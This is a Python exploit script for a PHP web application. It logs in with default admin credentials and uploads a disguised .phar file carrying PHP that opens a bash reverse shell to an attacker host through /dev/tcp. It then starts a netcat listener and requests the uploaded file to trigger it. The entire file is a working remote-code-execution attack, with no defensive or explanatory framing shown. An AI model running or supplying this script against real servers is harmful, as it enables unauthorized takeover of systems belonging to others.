import requests, sys, argparse, subprocess, re, time, base64

s = requests.session()
proxies = {
  "http": "http://127.0.0.1:8080",
  "https": "https://127.0.0.1:8080",
}

def authenticate(ip, user, password):
	target = "http://%s/login.php" % ip
	data = {'username': user,
			'password': password}
	print("\n[+] Attempting to authenticate...")
	req = s.post(target, data=data, allow_redirects=True)
	res = req.text
	usermatch = re.search(r'<div class="center_div"></a>(.*?)<br>', res)
	if usermatch:
		output = usermatch.group(1)
		print(output)
	else:
		print("\n[!] Failed to authenticate.")
		sys.exit(-1)

def rce(ip, lhost, lport):
    print("\n[+] Crafting serialized payload...")
    payload = "GIF98a;<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'\");?>" % (lhost, lport)
    files = { "image": ("image.phar", payload, "image/png"),
	          "title": "xxx" }
    print("\n[+] Delivering crafted payload...")
    target = "http://%s" % ip
    s.post(target + "/admin/upload_image.php", files=files, proxies=proxies, allow_redirects=False)
    print("\n[+] Triggering payload...")
    subprocess.Popen(["nc","-lnvp","%s" % lport])
    time.sleep(1)
    s.get(target + "/images/image.phar")
    while True:
	    pass

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip', help='Target IP address', required=True)
    parser.add_argument('--lhost', help='Local host', required=True)
    parser.add_argument('--lport', help='Local port', required=True)
    args = parser.parse_args()
    ip = args.ip
    user = "admin"
    passwd = "admin"
    lhost = args.lhost
    lport = args.lport

    authenticate(ip, user, passwd)
    rce(ip, lhost, lport)

if __name__ == "__main__":
	main()
